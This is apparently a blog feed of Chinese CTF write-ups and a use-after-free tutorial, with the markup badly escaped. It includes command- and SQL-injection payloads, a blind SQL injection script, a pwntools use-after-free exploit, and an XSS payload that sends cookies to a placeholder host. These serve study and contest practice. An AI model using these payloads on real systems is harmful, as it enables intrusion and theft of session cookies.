src="http://img.blog.csdn.net/20170707164049179?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p></code></pre></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x00 漏洞简介  2012年9月，通用漏洞与披露平台发布了一个存在IE浏览器的UAF漏洞。   报告指出：Microsoft Internet Explorer 6至9版本中的mshtml.dll中的CMshtmlEd::Exec函数中存在释放后使用漏洞。远程攻击者可利用该漏洞通过特制的网站，执行任意代码。 0x01 测试环境操作系统：Windows XP sp3浏览器：IE 8.00.6&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞调试" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>2017 某校赛 Writeup</title>
    <link href="http://yoursite.com/2017/06/25/2017%20%E6%9F%90%E6%A0%A1%E8%B5%9B%20Writeup/"/>
    <id>http://yoursite.com/2017/06/25/2017 某校赛 Writeup/</id>
    <published>2017-06-24T23:45:00.000Z</published>
    <updated>2017-10-22T02:14:26.047Z</updated>
    
    <content type="html"><![CDATA[<p>这次校赛的时候只做了web题 ，。。。。<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p>这次校赛的时候只做了web题 ，。。。。</p><br><h1 id="web">WEB</h1><br><h2 id="0x01-admin">0x01 admin</h2><br><p>直接扫描出来robots.txt <br><br>访问得到 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625070204493?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>访问admin <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625070311518?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>注意把cookie 的admin项改成1<br><br><br><br><br></p><br><h2 id="0x02-babyphp">0x02 babyphp</h2><br><p>浏览网页，发现了猫腻 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625070521337?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><p>本题有.git泄露可以直接下到源码，一开始以为是版本控制，但发现只有本地git只有一个版本 <br><br>接下来下到了源码 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625070721926?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>一道很明显的执行命令的题目，只需要闭合引号和括号即可 <br><br>最后构造<code>page=’.system(“ls”).’home</code> <br><br>命令执行一番还是发现无果 <br><br>最后利用git diff比较分支查到了flag <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625071528214?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br><br><br><br></p><br><h2 id="0x03-inject">0x03 inject</h2><br><p>一道简单的注入题目 <br><br>搜索目录找到了备份文件<br></p><br><pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">“config.php”</span>);<br><span class="hljs-variable">$table</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘table’</span>]?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">‘table’</span>]:<span class="hljs-string">“test”</span>;<br><span class="hljs-variable">$table</span> = Filter(<span class="hljs-variable">$table</span>);<br>mysqli<em>query(<span class="hljs-variable">$mysqli</span>,<span class="hljs-string">“desc `secret</span></em>{$table}<code>&quot;&lt;/span&gt;) &lt;span class=&quot;hljs-keyword&quot;&gt;or&lt;/span&gt; Hacker();&lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt; = &lt;span class=&quot;hljs-string&quot;&gt;&quot;select &#39;flag{xxx}&#39; from secret_{$table}&quot;&lt;/span&gt;;&lt;span class=&quot;hljs-variable&quot;&gt;$ret&lt;/span&gt; = sql_query(&lt;span class=&quot;hljs-variable&quot;&gt;$sql&lt;/span&gt;);&lt;span class=&quot;hljs-keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$ret&lt;/span&gt;[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;];&lt;span class=&quot;hljs-preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;首先&lt;code&gt;mysqli_query($mysqli,&quot;desc&lt;/code&gt;secret_{$table}&lt;code&gt;&quot;) or Hacker();&lt;/code&gt;要执行成功 &lt;br&gt;其次是注入语句 &lt;br&gt;我们可以构造table=test&lt;code&gt;&lt;/code&gt;union select     ···的语句查询 &lt;br&gt;第一次我构造了 &lt;br&gt;test</code> <code>where 1=2 union select 1 from secret_flag  &lt;br&gt;&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170625072115709?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;&lt;p&gt;后来才知道D是查询为空，只能换种写法 &lt;br&gt;test</code> <code>union select 1 from secret_flag limit 1,1 &lt;br&gt;&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170625072429407?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;&lt;p&gt;有了显示位下面就是正常的注入流程。 &lt;br&gt;利用test</code> <code>union select flagUwillNeverKnow from secret_flag limit 1,1 &lt;br&gt;最后得到flag&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;&lt;h2 id=&quot;0x04-babyxss&quot;&gt;0x04 babyxss&lt;/h2&gt;&lt;p&gt;一道简单的xss题目，一开始一直犯sb，经提示，恍然大悟。&lt;/p&gt;&lt;h3 id=&quot;0x1-验证码&quot;&gt;0x1 验证码&lt;/h3&gt;&lt;p&gt;验证码就不说啥了，经常遇见这里再贴上脚本&lt;/p&gt;&lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs python&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; random&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; string&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(str)&lt;/span&gt;:&lt;/span&gt;    &lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; hashlib    m = hashlib.md5()    m.update(str)    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; m.hexdigest()&lt;span class=&quot;hljs-keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;:    string = &lt;span class=&quot;hljs-string&quot;&gt;&#39;&#39;&lt;/span&gt;    s = string.join(random.sample(&lt;span class=&quot;hljs-string&quot;&gt;&#39;qwertyuiopasdfghjklzxcvbnm1234567890&#39;&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;))    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; md5(s)[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;] == &lt;span class=&quot;hljs-string&quot;&gt;&#39;58a204&#39;&lt;/span&gt;:        &lt;span class=&quot;hljs-keyword&quot;&gt;print&lt;/span&gt; s        &lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;0x2-绕过csp&quot;&gt;0x2 绕过csp&lt;/h3&gt;&lt;p&gt;现在绕过csp的方法很简单，也很固定利用chrome的prefetch属性进行预加载绕过。 &lt;br&gt;观察发现此题是严格csp限制 &lt;br&gt;&lt;code&gt;default-src &#39;self&#39;; script-src &#39;self&#39; ;&lt;/code&gt; &lt;br&gt;只能加载同源脚本，一般XSS是支持内联脚本的。 &lt;br&gt;那么现在又有个问题，我们怎么能加载同源可控脚本呢？&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;&lt;h3 id=&quot;0x3-上传同源可控脚本&quot;&gt;0x3 上传同源可控脚本&lt;/h3&gt;&lt;p&gt;这里我首先发送标签 &lt;br&gt;&lt;code&gt;&amp;lt;link rel=&quot;prefetch&quot; href=&quot;http://xxxx/XSS/?c=[cookie]&quot;&amp;gt;&lt;/code&gt; &lt;br&gt;在我XSS平台上收到了一个带有referer字段的http包 &lt;br&gt;里面有admin网址，以及我发送的留言信息。&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;&lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs avrasm&quot;&gt;var n0t = document&lt;span class=&quot;hljs-preprocessor&quot;&gt;.createElement&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;link&quot;&lt;/span&gt;)&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;n0t&lt;span class=&quot;hljs-preprocessor&quot;&gt;.setAttribute&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;rel&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;prefetch&quot;&lt;/span&gt;)&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;n0t&lt;span class=&quot;hljs-preprocessor&quot;&gt;.setAttribute&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;href&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;http://xxxx/?a=&quot;&lt;/span&gt;+document&lt;span class=&quot;hljs-preprocessor&quot;&gt;.cookie&lt;/span&gt;)&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;document&lt;span class=&quot;hljs-preprocessor&quot;&gt;.head&lt;/span&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;.appendChild&lt;/span&gt;(n0t)&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;&amp;lt;link rel=&lt;span class=&quot;hljs-string&quot;&gt;&quot;prefetch&quot;&lt;/span&gt; href=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://xxxxx/?c=[cookie]&quot;&lt;/span&gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这点我已开始没想到····，耽误了好长时间&lt;/p&gt;&lt;h3 id=&quot;0x4-利用组合姿势xss&quot;&gt;0x4 利用组合姿势XSS&lt;/h3&gt;&lt;p&gt;有了同源可控脚本我们再次上传一个&lt;/p&gt;&lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;http://39.108.192.25:5004/4dmIn.php?id=eef85d17855c8aca3c9df877511cfe17&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;就可以把我们的脚本当做js脚本引用执行&lt;/p&gt;&lt;p&gt;还有个坑js脚本里面有标签的时候，会解析报错。 &lt;br&gt;这里把他注释掉,就可以了 这个是我脑洞出来的，不过很有效果，因为html不执行//&lt;/br&gt;&lt;/p&gt;&lt;p&gt;最后收到一发XSS信息 &lt;br&gt;&lt;img alt=&quot;这里写图片描述&quot; src=&quot;http://img.blog.csdn.net/20170625074459255?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; title=&quot;&quot;/&gt;&lt;/br&gt;&lt;/p&gt;&lt;h2 id=&quot;0x05-register&quot;&gt;0x05 register&lt;/h2&gt;&lt;p&gt;这道题给了提示之后还是没有做出来，主要是卡在了不知道country字段，影响了什么。这才是二次注入的关键点，最后得知是影响了时间，瞬间有了思路，但还是不知道有什么表这里利用猜测的办法猜到数据表是users &lt;br&gt;于是就可以利用时间的不同进行盲注 &lt;br&gt;下面贴出盲注脚本&lt;/br&gt;&lt;/br&gt;&lt;/p&gt;&lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs python&quot;&gt;&lt;span class=&quot;hljs-comment&quot;&gt;# coding:utf-8&lt;/span&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; requests&lt;span class=&quot;hljs-keyword&quot;&gt;from&lt;/span&gt; math &lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; ceil&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; re&lt;span class=&quot;hljs-keyword&quot;&gt;from&lt;/span&gt; random &lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; *&lt;span class=&quot;hljs-keyword&quot;&gt;global&lt;/span&gt; stringstring = &lt;span class=&quot;hljs-string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;dichotomie&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(l,r,i)&lt;/span&gt;:&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;#利用二分法查找&lt;/span&gt;    mid = (l+r)/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;    &lt;span class=&quot;hljs-comment&quot;&gt;# print &quot;l and r ,mid:&quot;,l,r,mid&lt;/span&gt;    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; l == r:        &lt;span class=&quot;hljs-keyword&quot;&gt;global&lt;/span&gt; string        string += chr(r)        &lt;span class=&quot;hljs-keyword&quot;&gt;print&lt;/span&gt; string        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; charge(mid,i):&lt;span class=&quot;hljs-comment&quot;&gt;#&amp;lt;=&lt;/span&gt;        &lt;span class=&quot;hljs-comment&quot;&gt;#print 0&lt;/span&gt;        dichotomie(l,mid,i)    &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:        &lt;span class=&quot;hljs-comment&quot;&gt;#print 1&lt;/span&gt;        dichotomie(int(ceil((l+r)*&lt;span class=&quot;hljs-number&quot;&gt;1.0&lt;/span&gt;/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;)),r,i)&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;charge&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(mid,i)&lt;/span&gt;:&lt;/span&gt;    payload = &lt;span class=&quot;hljs-string&quot;&gt;&quot;&#39;or(select(ascii(substr(group_concat(c),{}))&amp;lt;={}) from (select 1,2,3</code>c<code>,4,5 union(select*from(users)))</code>b`) #”</span>.format(i,mid)<br>    login = requests.session()<br>    username = <span class="hljs-string">“4ct10n”</span>+str(randint(<span class="hljs-number">1</span>,<span class="hljs-number">10000000</span>))<br>    data = {<br>    <span class="hljs-string">‘username’</span>:username,<br>    <span class="hljs-string">‘password’</span>:<span class="hljs-string">‘1’</span>,<br>    <span class="hljs-string">‘address’</span>:<span class="hljs-string">‘1’</span>,<br>    <span class="hljs-string">‘country’</span>:payload<br>    }<br>    login.post(<span class="hljs-string">‘<a href="http://39.108.192.25:5005/register.php" target="_blank" rel="external">http://39.108.192.25:5005/register.php</a>‘</span>,data=data)<br>    data = {<br>    <span class="hljs-string">‘username’</span>:username,<br>    <span class="hljs-string">‘password’</span>:<span class="hljs-string">‘1’</span><br>    }<br>    login.post(<span class="hljs-string">‘<a href="http://39.108.192.25:5005/login.php" target="_blank" rel="external">http://39.108.192.25:5005/login.php</a>‘</span>,data=data)<br>    res = login.get(<span class="hljs-string">‘<a href="http://39.108.192.25:5005/index.php?page=info" target="_blank" rel="external">http://39.108.192.25:5005/index.php?page=info</a>‘</span>)<br>    string = res.content<br>    r = re.findall(<span class="hljs-string">‘2017-07-01 (.*)&lt;/em&gt;’</span>,string)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>    <span class="hljs-comment"># print r</span><br>    <span class="hljs-keyword">if</span> r == <span class="hljs-string">‘05’</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-comment"># print data</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    dichotomie(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>,i)<br><span class="hljs-keyword">print</span> string</code></pre></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次校赛的时候只做了web题 ，。。。。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="write-up" scheme="http://yoursite.com/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>pwnable dragon</title>
    <link href="http://yoursite.com/2017/06/24/pwnable%20dragon/"/>
    <id>http://yoursite.com/2017/06/24/pwnable dragon/</id>
    <published>2017-06-23T16:23:00.000Z</published>
    <updated>2017-10-22T02:14:26.427Z</updated>
    
    <content type="html"><![CDATA[<p>借着这段时间学UAF，又找了一道UAF的题目做了一下，这个题目很简单，看着WP写的，思路也非常的清晰。<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><blockquote><br><p>借着这段时间学UAF，又找了一道UAF的题目做了一下，这个题目很简单，看着WP写的，思路也非常的清晰。</p><br></blockquote><br><p>题目地址： <br><br>nc pwnable.kr 9004 <br><br>题目下载： <br><br><a href="http://pwnable.kr/bin/dragon" target="_blank" rel="external">http://pwnable.kr/bin/dragon</a><br><br><br></p><br><h1 id="0x01-简单分析">0x01 简单分析</h1><br><p>这题是让我们打龙，首先利用IDA查看龙的相关信息 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623230511757?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>上面是两个龙的结构体<br><br></p><br><p>又发现了一个神秘关卡 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623230738531?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><p>里面有要获取的shell</p><br><p>发现在杀死龙之后会释放龙内存，同时也会重新申请相同大小的内存进行写入而且偏移量正好是龙结构体的函数指针处。这样我们就能利用UAF（释放重利用）控制整个程序流。下面第一个难题是怎样杀死一条龙。</p><br><h1 id="0x02-屠龙">0x02 屠龙</h1><br><p>Priest <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623235140524?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>Knight <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170624001143324?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br></p><br><p>我们发现如果是直接想把龙打死是不可能的但是我们发现了一个技能Priest的3技能 <br><br>可以是龙的回升.同时发现大龙的血是80 一个字节127可以使其溢出，从而把大龙打死。<br></p><br><h1 id="0x03-编写exp">0x03 编写exp</h1><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = remote(<span class="hljs-string">‘pwnable.kr’</span>,<span class="hljs-number">9004</span>) <span class="hljs-comment">#process(‘./dragon’)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">killself</span><span class="hljs-params">(sh)</span>:</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>):<br>        sh.send(<span class="hljs-string">‘1’</span>+<span class="hljs-string">‘\n’</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">killdragon</span><span class="hljs-params">(sh)</span>:</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>):<br>        sh.send(<span class="hljs-string">‘3’</span>+<span class="hljs-string">‘\n’</span>)<br>        sh.send(<span class="hljs-string">‘3’</span>+<span class="hljs-string">‘\n’</span>)<br>        sh.send(<span class="hljs-string">‘2’</span>+<span class="hljs-string">‘\n’</span>)<br><br><br>killself(sh)<br>sh.send(<span class="hljs-string">‘1’</span>+<span class="hljs-string">‘\n’</span>)<br>killdragon(sh)<br>sh.send(p32(<span class="hljs-number">0x08048DBF</span>))<br>sh.interactive()</code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170624002304784?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;借着这段时间学UAF，又找了一道UAF的题目做了一下，这个题目很简单，看着WP写的，思路也非常的清晰。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>UAF (Use After Free)漏洞分析及利用</title>
    <link href="http://yoursite.com/2017/06/23/UAF%20(Use%20After%20Free)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2017/06/23/UAF (Use After Free)漏洞分析及利用/</id>
    <published>2017-06-22T16:20:00.000Z</published>
    <updated>2017-10-22T02:14:26.895Z</updated>
    
    <content type="html"><![CDATA[<p>因为大作业的需求要调试一个浏览器的UAF漏洞，首先必须对UAF漏洞有个整体的了解，本篇文章主要讲解UAF造成的原因以及利用方法，这里结合2016年HCTF fheap<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><blockquote><br><p>因为大作业的需求要调试一个浏览器的UAF漏洞，首先必须对UAF漏洞有个整体的了解，本篇文章主要讲解UAF造成的原因以及利用方法，这里结合2016年HCTF fheap <br><br>  题目分析起来还是有点耐人寻味。<br></p><br></blockquote><br><h1 id="0x01-uaf-原理">0x01 UAF 原理</h1><br><p>这里首先放一段简单的c代码，让大家更容易理解（linux 环境）</p><br><pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-preprocessor">#include &lt;stdio.h&gt;</span><br><span class="hljs-preprocessor">#include &lt;cstdlib&gt;</span><br><span class="hljs-preprocessor">#include &lt;string.h&gt;</span><br><span class="hljs-keyword">int</span> main()<br>{<br>    <span class="hljs-keyword">char</span> <em>p1;<br>    p1 = (<span class="hljs-keyword">char</span> </em>) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>)<em><span class="hljs-number">10</span>);<span class="hljs-comment">//申请内存空间</span><br>    <span class="hljs-built_in">memcpy</span>(p1,<span class="hljs-string">“hello”</span>,<span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">“p1 addr:%x,%s\n”</span>,p1,p1);<br>    <span class="hljs-built_in">free</span>(p1);<span class="hljs-comment">//释放内存空间</span><br>    <span class="hljs-keyword">char</span> </em>p2;<br>    p2 = (<span class="hljs-keyword">char</span> <em>)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>)</em><span class="hljs-number">10</span>);<span class="hljs-comment">//二次申请内存空间，与第一次大小相同，申请到了同一块内存</span><br>    <span class="hljs-built_in">memcpy</span>(p1,<span class="hljs-string">“world”</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//对内存进行修改</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">“p2 addr:%x,%s\n”</span>,p2,p1);<span class="hljs-comment">//验证</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}</code></pre><br><p>如上代码所示</p><br><blockquote><br><p>1.指针p1申请内存，打印其地址值 <br><br>  2.然后释放p1 <br><br>  3.指针p2申请同样大小的内存，打印p2的地址，p1指针指向的值<br><br></p><br></blockquote><br><p>Gcc编译，运行结果如下： <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170622235950792?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>p1与p2地址相同，p1指针释放后，p2申请相同的大小的内存，操作系统会将之前给p1的地址分配给p2，修改p2的值，p1也被修改了。<br><br></p><br><p>重温程序，看注释</p><br><hr><br><p><strong>根本原因</strong></p><br><blockquote><br><p>应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</p><br></blockquote><br><p>简单讲就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</p><br><h1 id="0x02-漏洞的简单利用">0x02 漏洞的简单利用</h1><br><p>还是先放一段程序（linux x86）</p><br><pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-preprocessor">#include &lt;stdio.h&gt;</span><br><span class="hljs-preprocessor">#include &lt;stdlib.h&gt;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">void</span> (<em>func_ptr)(<span class="hljs-keyword">char</span> </em>);<br><span class="hljs-keyword">void</span> evil_fuc(<span class="hljs-keyword">char</span> command[])<br>{<br>system(command);<br>}<br><span class="hljs-keyword">void</span> echo(<span class="hljs-keyword">char</span> content[])<br>{<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">“%s”</span>,content);<br>}<br><span class="hljs-keyword">int</span> main()<br>{<br>    func_ptr <em>p1=(func_ptr</em>)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4</span><em><span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">“malloc addr: %p\n”</span>,p1);<br>    p1[<span class="hljs-number">3</span>]=echo;<br>    p1<a href="span class=&quot;hljs-string&quot;&gt;&quot;hello world\n&quot;&lt;/span"><span class="hljs-number">3</span></a>;<br>    <span class="hljs-built_in">free</span>(p1); <span class="hljs-comment">//在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span><br>    p1<a href="span class=&quot;hljs-string&quot;&gt;&quot;hello again\n&quot;&lt;/span"><span 